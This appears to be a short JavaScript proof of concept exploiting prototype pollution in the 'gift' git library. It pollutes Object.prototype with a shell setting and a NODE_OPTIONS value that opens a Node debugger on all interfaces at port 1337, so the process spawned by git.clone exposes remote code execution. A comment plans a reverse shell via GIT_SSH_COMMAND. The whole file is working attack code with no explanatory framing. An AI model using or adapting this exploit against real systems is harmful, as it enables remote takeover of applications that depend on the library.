const git  = require('gift');

Object.prototype.shell = "node";
Object.prototype.NODE_OPTIONS = '--inspect-brk=0.0.0.0:1337';

// TODO: try a reverse shell by GIT_SSH_COMMAND

git.clone('repository', __dirname + "/repo"); // `spawn` sink
